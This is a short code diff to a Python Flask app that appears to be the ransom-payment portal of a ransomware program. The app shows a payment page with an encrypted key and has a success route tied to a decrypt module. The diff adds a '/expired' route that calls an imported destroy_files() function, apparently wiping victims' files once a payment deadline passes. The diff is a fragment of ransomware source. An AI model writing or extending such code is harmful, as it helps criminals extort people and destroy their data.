@@ -1,6 +1,5 @@
 from flask import Flask, render_template, request, redirect
-from maindecrypt import decrypt  # Import decrypt logic
-
+from maindecrypt import decrypt, destroy_files   # Import decrypt logic
 def create_app(encrypted_key_b64):
     app = Flask(__name__)
 
@@ -11,6 +10,11 @@ def create_app(encrypted_key_b64):
     @app.route('/payment')
     def payment():
         return render_template('payment.html', key=encrypted_key_b64)
+    
+    @app.route('/expired')
+    def expired():
+        destroy_files()
+        return render_template('expired.html')
 
     @app.route('/success', methods=['POST'])
     def success():
